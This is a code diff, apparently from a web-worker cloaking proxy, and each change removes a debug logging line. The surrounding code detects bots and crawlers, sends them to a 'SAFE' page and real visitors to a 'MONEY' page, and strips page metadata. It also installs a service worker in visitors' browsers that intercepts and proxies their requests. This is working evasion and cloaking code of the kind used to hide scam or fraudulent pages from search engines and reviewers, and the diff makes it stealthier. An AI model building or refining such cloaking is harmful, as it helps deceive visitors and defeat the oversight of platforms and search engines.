@@ -818,11 +818,9 @@ async function handleRequest(request) {
       '  /crawler/i, /spider/i, /scraper/i\\n' +
       '];\\n\\n' +
       'self.addEventListener(\\'install\\', () => {\\n' +
-      '  console.log(\\'🔧 Service Worker installing\\');\\n' +
       '  self.skipWaiting();\\n' +
       '});\\n\\n' +
       'self.addEventListener(\\'activate\\', event => {\\n' +
-      '  console.log(\\'🚀 Service Worker activated\\');\\n' +
       '  event.waitUntil(self.clients.claim());\\n' +
       '});\\n\\n' +
       'self.addEventListener(\\'fetch\\', event => {\\n' +
@@ -830,11 +828,8 @@ async function handleRequest(request) {
       '  const url = new URL(request.url);\\n' +
       '  const selfOrigin = new URL(self.registration.scope).origin;\\n' +
       '  \\n' +
-      '  console.log(\\'🔍 SW intercepting:\\', url.href, \\'Mode:\\', request.mode);\\n' +
-      '  \\n' +
       '  // Don\\'t intercept same-origin requests or navigation requests\\n' +
       '  if (url.origin === selfOrigin || request.mode === \\'navigate\\') {\\n' +
-      '    console.log(\\'⏭️ Skipping same-origin/navigation request\\');\\n' +
       '    return;\\n' +
       '  }\\n' +
       '  \\n' +
@@ -846,7 +841,6 @@ async function handleRequest(request) {
       '  \\n' +
       '  // Block known trackers and analytics\\n' +
       '  if (TRACKER_BLACKLIST.some(tracker => url.hostname.includes(tracker) || url.pathname.includes(tracker))) {\\n' +
-      '    console.log(\\'🚫 Blocked tracker:\\', url.hostname, url.pathname);\\n' +
       '    \\n' +
       '    // Return appropriate response to minimize console errors\\n' +
       '    if (url.pathname.endsWith(\\'.js\\')) {\\n' +
@@ -875,7 +869,6 @@ async function handleRequest(request) {
       '  // Block suspicious user agents at service worker level\\n' +
       '  const userAgent = request.headers.get(\\'User-Agent\\') || \\'\\';\\n' +
       '  if (SEARCH_ENGINE_PATTERNS.some(pattern => pattern.test(userAgent))) {\\n' +
-      '    console.log(\\'🤖 Blocked bot request:\\', userAgent);\\n' +
       '    event.respondWith(new Response(null, { status: 204 }));\\n' +
       '    return;\\n' +
       '  }\\n' +
@@ -902,7 +895,6 @@ async function handleRequest(request) {
       '  \\n' +
       '  // Only proxy suspicious requests, let legitimate content through\\n' +
       '  if (shouldProxy) {\\n' +
-      '    console.log(\\'🔄 SW proxying request:\\', url.href);\\n' +
       '    event.respondWith(\\n' +
       '      (async () => {\\n' +
       '        try {\\n' +
@@ -926,14 +918,11 @@ async function handleRequest(request) {
       '          const proxyRequest = new Request(proxyUrl, requestOptions);\\n' +
       '          return await fetch(proxyRequest);\\n' +
       '        } catch (error) {\\n' +
-      '          console.error(\\'SW proxy error:\\', error);\\n' +
       '          return new Response(null, { status: 204 });\\n' +
       '        }\\n' +
       '      })()\\n' +
       '    );\\n' +
       '    return;\\n' +
-      '  } else {\\n' +
-      '    console.log(\\'⏭️ SW letting request pass through:\\', url.href);\\n' +
       '  }\\n' +
       '  // Let all other requests pass through normally\\n' +
       '});';
@@ -969,7 +958,6 @@ async function isVisitorABot(request) {
   // ✅ CRITICAL: Check if this is a back button navigation from same domain
   const requestUrl = new URL(request.url);
   if (referer && referer.includes(requestUrl.hostname)) {
-    console.log('🔄 Back button navigation detected from same domain');
     // For back button navigation, maintain the same classification
     // Check if previous request was classified as bot (more conservative approach)
     botScore += 0.1; // Slight bias toward maintaining bot classification
@@ -1011,7 +999,6 @@ async function isVisitorABot(request) {
       
       // ✅ CRITICAL: If we've already classified this session, maintain consistency
       if (tracker.wasClassifiedAsBot !== undefined) {
-        console.log('🔒 Using cached bot classification for session:', tracker.wasClassifiedAsBot);
         // Strong bias toward maintaining previous classification
         botScore += tracker.wasClassifiedAsBot ? 0.9 : -0.5;
       }
@@ -1088,16 +1075,8 @@ async function isVisitorABot(request) {
   if (requestTracker.has(clientKey)) {
     const tracker = requestTracker.get(clientKey);
     tracker.wasClassifiedAsBot = isBot;
-    console.log('💾 Stored bot classification for session:', isBot);
   }
   
-  console.log('🔍 Bot detection details:');
-  console.log('  - Final bot score:', botScore);
-  console.log('  - Is classified as bot:', isBot);
-  console.log('  - User Agent:', userAgent);
-  console.log('  - Client IP:', clientIP);
-  console.log('  - Referer:', referer);
-  console.log('Bot detection result:', isBot, 'Score:', botScore.toFixed(2));
   return isBot;
 
   } catch (error) {
@@ -1132,13 +1111,7 @@ async function handleMainRequest(request) {
     
     const baseTargetUrl = isBot ? SAFE_URL : MONEY_URL;
     
-    console.log('🎯 Routing to:', isBot ? 'SAFE' : 'MONEY', 'page for IP:', clientIP);
-    console.log('📍 Original URL:', requestUrl.href);
-    console.log('🔗 Target URL:', targetUrl);
-    console.log('🛡️ Path Parity:', requestUrl.pathname, '→', new URL(targetUrl).pathname);
-    console.log('🤖 Bot detection result:', isBot);
-    console.log('👤 User Agent:', request.headers.get('User-Agent'));
-    console.log('🌍 Accept Header:', request.headers.get('Accept'));
+    // Routing decision made
     
     const upstreamHeaders = new Headers(request.headers);
     upstreamHeaders.set('X-Forwarded-For', clientIP);
@@ -1153,19 +1126,9 @@ async function handleMainRequest(request) {
       body: request.body
     });
     
-    console.log('🌐 Fetching upstream URL:', targetUrl);
     const response = await fetch(upstreamRequest);
     
-    console.log('📡 Upstream response status:', response.status);
-    console.log('📋 Upstream response headers:', [...response.headers.entries()]);
-    
     if (!response.ok) {
-      console.error('❌ Upstream error:', response.status, response.statusText, 'for', targetUrl);
-      console.error('🔍 Response headers:', [...response.headers.entries()]);
-      
-      // Try to get response body for debugging
-      const errorBody = await response.text();
-      console.error('💥 Error response body:', errorBody.substring(0, 500));
       
       return new Response('<!DOCTYPE html><html><head><title>Page Not Found</title></head><body><h1>404 - Page Not Found</h1><p>The requested page could not be found.</p><p>Debug: ' + response.status + ' ' + response.statusText + '</p></body></html>', {
         status: 404,
@@ -1176,18 +1139,7 @@ async function handleMainRequest(request) {
       });
     }
     
-    // Check if response has content
-    const contentLength = response.headers.get('content-length');
-    const contentType = response.headers.get('content-type');
-    console.log('📏 Content length:', contentLength);
-    console.log('📄 Content type:', contentType);
-    
-    console.log('🔧 Setting up HTMLRewriter for:', requestUrl.pathname);
-    console.log('🎯 Base target URL:', baseTargetUrl);
-    console.log('🏠 Proxy domain:', requestUrl.hostname);
-    
     // ✅ FIXED: Re-enable HTMLRewriter with safer, more conservative approach
-    console.log('🔧 Enabling conservative HTMLRewriter');
     
     const rewriter = new HTMLRewriter()
       // Only enable essential rewriters that won't break the page
@@ -1197,7 +1149,6 @@ async function handleMainRequest(request) {
       .on('script[type="application/ld+json"]', new MetadataStripper())
       .on('base', {
         element(base) {
-          console.log('🧱 Stripping <base> tag:', base.getAttribute('href'));
           base.remove();
         }
       });
@@ -1236,7 +1187,6 @@ async function handleMainRequest(request) {
     return finalResponse;
     
   } catch (error) {
-    console.error('Main request handler error:', error.message);
     return new Response('<!DOCTYPE html><html><head><title>Service Unavailable</title></head><body><h1>503 - Service Unavailable</h1><p>The service is temporarily unavailable. Please try again later.</p></body></html>', {
       status: 503,
       headers: {
@@ -1252,26 +1202,19 @@ async function handleResourceRequest(request) {
     const url = new URL(request.url);
     const encodedUrl = url.pathname.replace('/' + CDN_PATH + '/', '');
     
-    console.log('🔗 Resource request for CDN path:', url.pathname);
-    console.log('📦 Encoded URL:', encodedUrl);
-    
     if (!encodedUrl) {
-      console.warn('❌ Empty encoded URL from path:', url.pathname);
       return new Response('Empty resource URL', { status: 400 });
     }
     
     // More lenient base64 validation - allow URL-safe base64
     if (!encodedUrl.match(/^[A-Za-z0-9+/_-]*={0,2}$/)) {
-      console.warn('Invalid base64 URL format:', encodedUrl);
       return new Response('Invalid resource URL format', { status: 400 });
     }
     
     let resourceUrl;
     try {
       resourceUrl = atob(encodedUrl);
-      console.log('🎯 Decoded resource URL:', resourceUrl);
     } catch (decodeError) {
-      console.warn('❌ Failed to decode base64 URL:', encodedUrl);
       return new Response('Malformed resource URL', { status: 400 });
     }
     
@@ -1279,7 +1222,6 @@ async function handleResourceRequest(request) {
     try {
       targetUrl = new URL(resourceUrl);
     } catch (urlError) {
-      console.warn('Invalid decoded URL:', resourceUrl);
       return new Response('Malformed resource URL', { status: 400 });
     }
 
@@ -1300,8 +1242,6 @@ async function handleResourceRequest(request) {
     cleanHeaders.set('Host', targetUrl.hostname);
     cleanHeaders.set('Origin', targetUrl.origin);
     
-    console.log('🏠 Setting Host header to:', targetUrl.hostname);
-    
     // Create clean request with proper headers
     const resourceRequest = new Request(resourceUrl, {
       method: 'GET',
@@ -1312,9 +1252,7 @@ async function handleResourceRequest(request) {
     let response;
     try {
       response = await fetch(resourceRequest);
-      console.log('✅ Resource fetch success:', response.status, 'for', resourceUrl);
     } catch (fetchError) {
-      console.warn('❌ Resource fetch network error:', resourceUrl, fetchError.message);
       
       // Return appropriate error response based on expected resource type
       const pathname = targetUrl.pathname.toLowerCase();
